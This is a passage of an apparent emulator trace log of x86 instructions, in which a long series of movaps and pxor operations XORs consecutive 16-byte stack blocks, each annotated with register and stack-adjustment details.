ptr [esp + 0x1f90], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f90 for stack size 0x10000 saving data to stack: 0 16 0x4059ae: movaps xmm1, xmmword ptr [esp + 0x1fa0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9fa0 for stack size 0x10000 0x4059b6: pxor xmm1, xmmword ptr [esp + 0xc70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c70 for stack size 0x10000 0x4059bf: movaps xmmword ptr [esp + 0x1fa0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9fa0 for stack size 0x10000 saving data to stack: 0 16 0x4059c7: movaps xmm1, xmmword ptr [esp + 0x1fb0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9fb0 for stack size 0x10000 0x4059cf: pxor xmm1, xmmword ptr [esp + 0xc80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c80 for stack size 0x10000 0x4059d8: movaps xmmword ptr [esp + 0x1fb0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9fb0 for stack size 0x10000 saving data to stack: 0 16 0x4059e0: movaps xmm1, xmmword ptr [esp + 0x1fc0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9fc0 for stack size 0x10000 0x4059e8: pxor xmm1, xmmword ptr [esp + 0xc90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c90 for stack size 0x10000 0x4059f1: movaps xmmword ptr [esp + 0x1fc0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9fc0 for stack size 0x10000 saving data to stack: 0 16 0x4059f9: movaps xmm1, xmmword ptr [esp + 0x1fd0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9fd0 for stack size 0x10000 0x405a01: pxor xmm1, xmmword ptr [esp + 0xca0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ca0 for stack size 0x10000 0x405a0a: movaps xmmword ptr [esp + 0x1fd0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9fd0 for stack size 0x10000 saving data to stack: 0 16 0x405a12: movaps xmm1, xmmword ptr [esp + 0x1fe0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9fe0 for stack size 0x10000 0x405a1a: pxor xmm1, xmmword ptr [esp + 0xcb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8cb0 for stack size 0x10000 0x405a23: movaps xmmword ptr [esp + 0x1fe0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9fe0 for stack size 0x10000 saving data to stack: 0 16 0x405a2b: movaps xmm1, xmmword ptr [esp + 0x1ff0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ff0 for stack size 0x10000 0x405a33: pxor xmm1, xmmword ptr [esp + 0xcc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8cc0 for stack size 0x10000 0x405a3c: movaps xmmword ptr [esp + 0x1ff0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ff0 for stack size 0x10000 saving data to stack: 0 16 0x405a44: movaps xmm1, xmmword ptr [esp + 0x2000], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa000 for stack size 0x10000 0x405a4c: pxor xmm1, xmmword ptr [esp + 0xcd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8cd0 for stack size 0x10000 0x405a55: movaps xmmword ptr [esp + 0x2000], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa000 for stack size 0x10000 saving data to stack: 0 16 0x405a5d: movaps xmm1, xmmword ptr [esp + 0x2010], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa010 for stack size 0x10000 0x405a65: pxor xmm1, xmmword ptr [esp + 0xce0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ce0 for stack size 0x10000 0x405a6e: movaps xmmword ptr [esp + 0x2010], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa010 for stack size 0x10000 saving data to stack: 0 16 0x405a76: movaps xmm1, xmmword ptr [esp + 0x2020], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa020 for stack size 0x10000 0x405a7e: pxor xmm1, xmmword ptr [esp + 0xcf0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8cf0 for stack size 0x10000 0x405a87: movaps xmmword ptr [esp + 0x2020], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa020 for stack size 0x10000 saving data to stack: 0 16 0x405a8f: movaps xmm1, xmmword ptr [esp + 0x2030], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa030 for stack size 0x10000 0x405a97: pxor xmm1, xmmword ptr [esp + 0xd00], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d00 for stack size 0x10000 0x405aa0: movaps xmmword ptr [esp + 0x2030], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa030 for stack size 0x10000 saving data to stack: 0 16 0x405aa8: movaps xmm1, xmmword ptr [esp + 0x2040], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa040 for stack size 0x10000 0x405ab0: pxor xmm1, xmmword ptr [esp + 0xd10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d10 for stack size 0x10000 0x405ab9: movaps xmmword ptr [esp + 0x2040], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa040 for stack size 0x10000 saving data to stack: 0 16 0x405ac1: movaps xmm1, xmmword ptr [esp + 0x2050], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa050 for stack size 0x10000 0x405ac9: pxor xmm1, xmmword ptr [esp + 0xd20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d20 for stack size 0x10000 0x405ad2: movaps xmmword ptr [esp + 0x2050], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa050 for stack size 0x10000 saving data to stack: 0 16 0x405ada: movaps xmm1, xmmword ptr [esp + 0x2060], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa060 for stack size 0x10000 0x405ae2: pxor xmm1, xmmword ptr [esp + 0xd30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d30 for stack size 0x10000 0x405aeb: movaps xmmword ptr [esp + 0x2060], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa060 for stack size 0x10000 saving data to stack: 0 16 0x405af3: movaps xmm1, xmmword ptr [esp + 0x2070], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa070 for stack size 0x10000 0x405afb: pxor xmm1, xmmword ptr [esp + 0xd40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d40 for stack size 0x10000 0x405b04: movaps xmmword ptr [esp + 0x2070], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa070 for stack size 0x10000 saving data to stack: 0 16 0x405b0c: movaps xmm1, xmmword ptr [esp + 0x2080], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa080 for stack size 0x10000 0x405b14: pxor xmm1, xmmword ptr [esp + 0xd50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d50 for stack size 0x10000 0x405b1d: movaps xmmword ptr [esp + 0x2080], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa080 for stack size 0x10000 saving data to stack: 0 16 0x405b25: movaps xmm1, xmmword ptr [esp + 0x2090], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa090 for stack size 0x10000 0x405b2d: pxor xmm1, xmmword ptr [esp + 0xd60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d60 for stack size 0x10000 0x405b36: movaps xmmword ptr [esp + 0x2090], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa090 for stack size 0x10000 saving data to stack: 0 16 0x405b3e: movaps xmm1, xmmword ptr [esp + 0x20a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa0a0 for stack size 0x10000 0x405b46: pxor xmm1, xmmword ptr [esp + 0xd70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d70 for stack size 0x10000 0x405b4f: movaps xmmword ptr [esp + 0x20a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa0a0 for stack size 0x10000 saving data to stack: 0 16 0x405b57: movaps xmm1, xmmword ptr [esp + 0x20b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa0b0 for stack size 0x10000 0x405b5f: pxor xmm1, xmmword ptr [esp + 0xd80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d80 for stack size 0x10000 0x405b68: movaps xmmword ptr [esp + 0x20b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa0b0 for stack size 0x10000 saving data to stack: 0 16 0x405b70: movaps xmm1, xmmword ptr [esp + 0x20c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa0c0 for stack size 0x10000 0x405b78: pxor xmm1, xmmword ptr [esp + 0xd90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8d90 for stack size 0x10000 0x405b81: movaps xmmword ptr [esp + 0x20c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa0c0 for stack size 0x10000 saving data to stack: 0 16 0x405b89: movaps xmm1, xmmword ptr [esp + 0x20d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa0d0 for stack size 0x10000 0x405b91: pxor xmm1, xmmword ptr [esp + 0xda0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8da0 for stack size 0x10000 0x405b9a: movaps xmmword ptr [esp + 0x20d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa0d0 for stack size 0x10000 saving data to stack: 0 16 0x405ba2: movaps xmm1, xmmword ptr [esp + 0x20e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa0e0 for stack size 0x10000 0x405baa: pxor xmm1, xmmword ptr [esp + 0xdb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8db0 for stack size 0x10000 0x405bb3: movaps xmmword ptr [esp + 0x20e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa0e0 for stack size 0x10000 saving data to stack: 0 16 0x405bbb: movaps xmm1, xmmword ptr [esp + 0x20f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa0f0 for stack size 0x10000 0x405bc3: pxor xmm1, xmmword ptr [esp + 0xdc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8dc0 for stack size 0x10000 0x405bcc: movaps xmmword ptr [esp + 0x20f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa0f0 for stack size 0x10000 saving data to stack: 0 16 0x405bd4: movaps xmm1, xmmword ptr [esp + 0x2100], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa100 for stack size 0x10000 0x405bdc: pxor xmm1, xmmword ptr [esp + 0xdd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8dd0 for stack size 0x10000 0x405be5: movaps xmmword ptr [esp + 0x2100], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa100 for stack size 0x10000 saving data to stack: 0 16 0x405bed: movaps xmm1, xmmword ptr [esp + 0x2110], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa110 for stack size 0x10000 0x405bf5: pxor xmm1, xmmword ptr [esp + 0xde0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8de0 for stack size 0x10000 0x405bfe: movaps xmmword ptr [esp + 0x2110], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa110 for stack size 0x10000 saving data to stack: 0 16 0x405c06: movaps xmm1, xmmword ptr [esp + 0x2120], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa120 for stack size 0x10000 0x405c0e: pxor xmm1, xmmword ptr [esp + 0xdf0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8df0 for stack size 0x10000 0x405c17: movaps xmmword ptr [esp + 0x2120], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa120 for stack size 0x10000 saving data to stack: 0 16 0x405c1f: movaps xmm1, xmmword ptr [esp + 0x2130], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa130 for stack size 0x10000 0x405c27: pxor xmm1, xmmword ptr [esp + 0xe00], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e00 for stack size 0x10000 0x405c30: movaps xmmword ptr [esp + 0x2130], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa130 for stack size 0x10000 saving data to stack: 0 16 0x405c38: movaps xmm1, xmmword ptr [esp + 0x2140], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa140 for stack size 0x10000 0x405c40: pxor xmm1, xmmword ptr [esp + 0xe10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e10 for stack size 0x10000 0x405c49: movaps xmmword ptr [esp + 0x2140], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa140 for stack size 0x10000 saving data to stack: 0 16 0x405c51: movaps xmm1, xmmword ptr [esp + 0x2150], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa150 for stack size 0x10000 0x405c59: pxor xmm1, xmmword ptr [esp + 0xe20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e20 for stack size 0x10000 0x405c62: movaps xmmword ptr [esp + 0x2150], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa150 for stack size 0x10000 saving data to stack: 0 16 0x405c6a: movaps xmm1, xmmword ptr [esp + 0x2160], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa160 for stack size 0x10000 0x405c72: pxor xmm1, xmmword ptr [esp + 0xe30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e30 for stack size 0x10000 0x405c7b: movaps xmmword ptr [esp + 0x2160], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa160 for stack size 0x10000 saving data to stack: 0 16 0x405c83: movaps xmm1, xmmword ptr [esp + 0x2170], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa170 for stack size 0x10000 0x405c8b: pxor xmm1, xmmword ptr [esp + 0xe40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e40 for stack size 0x10000 0x405c94: movaps xmmword ptr [esp + 0x2170], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa170 for stack size 0x10000 saving data to stack: 0 16 0x405c9c: movaps xmm1, xmmword ptr [esp + 0x2180], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa180 for stack size 0x10000 0x405ca4: pxor xmm1, xmmword ptr [esp + 0xe50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e50 for stack size 0x10000 0x405cad: movaps xmmword ptr [esp + 0x2180], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa180 for stack size 0x10000 saving data to stack: 0 16 0x405cb5: movaps xmm1, xmmword ptr [esp + 0x2190], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa190 for stack size 0x10000 0x405cbd: pxor xmm1, xmmword ptr [esp + 0xe60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e60 for stack size 0x10000 0x405cc6: movaps xmmword ptr [esp + 0x2190], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa190 for stack size 0x10000 saving data to stack: 0 16 0x405cce: movaps xmm1, xmmword ptr [esp + 0x21a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa1a0 for stack size 0x10000 0x405cd6: pxor xmm1, xmmword ptr [esp + 0xe70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e70 for stack size 0x10000 0x405cdf: movaps xmmword ptr [esp + 0x21a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa1a0 for stack size 0x10000 saving data to stack: 0 16 0x405ce7: movaps xmm1, xmmword ptr [esp + 0x21b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa1b0 for stack size 0x10000 0x405cef: pxor xmm1, xmmword ptr [esp + 0xe80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e80 for stack size 0x10000 0x405cf8: movaps xmmword ptr [esp + 0x21b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa1b0 for stack size 0x10000 saving data to stack: 0 16 0x405d00: movaps xmm1, xmmword ptr [esp + 0x21c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa1c0 for stack size 0x10000 0x405d08: pxor xmm1, xmmword ptr [esp + 0xe90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8e90 for stack size 0x10000 0x405d11: movaps xmmword ptr [esp + 0x21c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa1c0 for stack size 0x10000 saving data to stack: 0 16 0x405d19: movaps xmm1, xmmword ptr [esp + 0x21d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa1d0 for stack size 0x10000 0x405d21: pxor xmm1, xmmword ptr [esp + 0xea0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ea0 for stack size 0x10000 0x405d2a: movaps xmmword ptr [esp + 0x21d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa1d0 for stack size 0x10000 saving data to stack: 0 16 0x405d32: movaps xmm1, xmmword ptr [esp + 0x21e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa1e0 for stack size 0x10000 0x405d3a: pxor xmm1, xmmword ptr [esp + 0xeb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8eb0 for stack size 0x10000 0x405d43: movaps xmmword ptr [esp + 0x21e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa1e0 for stack size 0x10000 saving data to stack: 0 16 0x405d4b: movaps xmm1, xmmword ptr [esp + 0x21f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa1f0 for stack size 0x10000 0x405d53: pxor xmm1, xmmword ptr [esp + 0xec0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ec0 for stack size 0x10000 0x405d5c: movaps xmmword ptr [esp + 0x21f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa1f0 for stack size 0x10000 saving data to stack: 0 16 0x405d64: movaps xmm1, xmmword ptr [esp + 0x2200], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa200 for stack size 0x10000 0x405d6c: pxor xmm1, xmmword ptr [esp + 0xed0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ed0 for stack size 0x10000 0x405d75: movaps xmmword ptr [esp + 0x2200], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa200 for stack size 0x10000 saving data to stack: 0 16 0x405d7d: movaps xmm1, xmmword ptr [esp + 0x2210], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa210 for stack size 0x10000 0x405d85: pxor xmm1, xmmword ptr [esp + 0xee0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ee0 for stack size 0x10000 0x405d8e: movaps xmmword ptr [esp + 0x2210], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa210 for stack size 0x10000 saving data to stack: 0 16 0x405d96: movaps xmm1, xmmword ptr [esp + 0x2220], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa220 for stack size 0x10000 0x405d9e: pxor xmm1, xmmword ptr [esp + 0xef0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ef0 for stack size 0x10000 0x405da7: movaps xmmword ptr [esp + 0x2220], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa220 for stack size 0x10000 saving data to stack: 0 16 0x405daf: movaps xmm1, xmmword ptr [esp + 0x2230], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa230 for stack size 0x10000 0x405db7: pxor xmm1, xmmword ptr [esp + 0xf00], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f00 for stack size 0x10000 0x405dc0: movaps xmmword ptr [esp + 0x2230], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa230 for stack size 0x10000 saving data to stack: 0 16 0x405dc8: movaps xmm1, xmmword ptr [esp + 0x2240], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa240 for stack size 0x10000 0x405dd0: pxor xmm1, xmmword ptr [esp + 0xf10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f10 for stack size 0x10000 0x405dd9: movaps xmmword ptr [esp + 0x2240], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa240 for stack size 0x10000 saving data to stack: 0 16 0x405de1: movaps xmm1, xmmword ptr [esp + 0x2250], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa250 for stack size 0x10000 0x405de9: pxor xmm1, xmmword ptr [esp + 0xf20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f20 for stack size 0x10000 0x405df2: movaps xmmword ptr [esp + 0x2250], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa250 for stack size 0x10000 saving data to stack: 0 16 0x405dfa: movaps xmm1, xmmword ptr [esp + 0x2260], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa260 for stack size 0x10000 0x405e02: pxor xmm1, xmmword ptr [esp + 0xf30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f30 for stack size 0x10000 0x405e0b: movaps xmmword ptr [esp + 0x2260], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa260 for stack size 0x10000 saving data to stack: 0 16 0x405e13: movaps xmm1, xmmword ptr [esp + 0x2270], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa270 for stack size 0x10000 0x405e1b: pxor xmm1, xmmword ptr [esp + 0xf40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f40 for stack size 0x10000 0x405e24: movaps xmmword ptr [esp + 0x2270], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa270 for stack size 0x10000 saving data to stack: 0 16 0x405e2c: movaps xmm1, xmmword ptr [esp + 0x2280], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa280 for stack size 0x10000 0x405e34: pxor xmm1, xmmword ptr [esp + 0xf50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f50 for stack size 0x10000 0x405e3d: movaps xmmword ptr [esp + 0x2280], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa280 for stack size 0x10000 saving data to stack: 0 16 0x405e45: movaps xmm1, xmmword ptr [esp + 0x2290], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa290 for stack size 0x10000 0x405e4d: pxor xmm1, xmmword ptr [esp + 0xf60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f60 for stack size 0x10000 0x405e56: movaps xmmword ptr [esp + 0x2290], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa290 for stack size 0x10000 saving data to stack: 0 16 0x405e5e: movaps xmm1, xmmword ptr [esp + 0x22a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa2a0 for stack size 0x10000 0x405e66: pxor xmm1, xmmword ptr [esp + 0xf70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f70 for stack size 0x10000 0x405e6f: movaps xmmword ptr [esp + 0x22a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa2a0 for stack size 0x10000 saving data to stack: 0 16 0x405e77: movaps xmm1, xmmword ptr [esp + 0x22b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa2b0 for stack size 0x10000 0x405e7f: pxor xmm1, xmmword ptr [esp + 0xf80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f80 for stack size 0x10000 0x405e88: movaps xmmword ptr [esp + 0x22b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa2b0 for stack size 0x10000 saving data to stack: 0 16 0x405e90: movaps xmm1, xmmword ptr [esp + 0x22c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa2c0 for stack size 0x10000 0x405e98: pxor xmm1, xmmword ptr [esp + 0xf90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8f90 for stack size 0x10000 0x405ea1: movaps xmmword ptr [esp + 0x22c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa2c0 for stack size 0x10000 saving data to stack: 0 16 0x405ea9: movaps xmm1, xmmword ptr [esp + 0x22d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa2d0 for stack size 0x10000 0x405eb1: pxor xmm1, xmmword ptr [esp + 0xfa0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8fa0 for stack size 0x10000 0x405eba: movaps xmmword ptr [esp + 0x22d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa2d0 for stack size 0x10000 saving data to stack: 0 16 0x405ec2: movaps xmm1, xmmword ptr [esp + 0x22e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa2e0 for stack size 0x10000 0x405eca: pxor xmm1, xmmword ptr [esp + 0xfb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8fb0 for stack size 0x10000 0x405ed3: movaps xmmword ptr [esp + 0x22e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa2e0 for stack size 0x10000 saving data to stack: 0 16 0x405edb: movaps xmm1, xmmword ptr [esp + 0x22f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa2f0 for stack size 0x10000 0x405ee3: pxor xmm1, xmmword ptr [esp + 0xfc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8fc0 for stack size 0x10000 0x405eec: movaps xmmword ptr [esp + 0x22f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa2f0 for stack size 0x10000 saving data to stack: 0 16 0x405ef4: movaps xmm1, xmmword ptr [esp + 0x2300], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa300 for stack size 0x10000 0x405efc: pxor xmm1, xmmword ptr [esp + 0xfd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8fd0 for stack size 0x10000 0x405f05: movaps xmmword ptr [esp + 0x2300], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa300 for stack size 0x10000 saving data to stack: 0 16 0x405f0d: movaps xmm1, xmmword ptr [esp + 0x2310], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa310 for stack size 0x10000 0x405f15: pxor xmm1, xmmword ptr [esp + 0xfe0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8fe0 for stack size 0x10000 0x405f1e: movaps xmmword ptr [esp + 0x2310], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0xa310 for stack size 0x10000 saving data to stack: 0 16 0x405f26: movaps xmm1, xmmword ptr [esp + 0x2320], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0xa320 for stack size 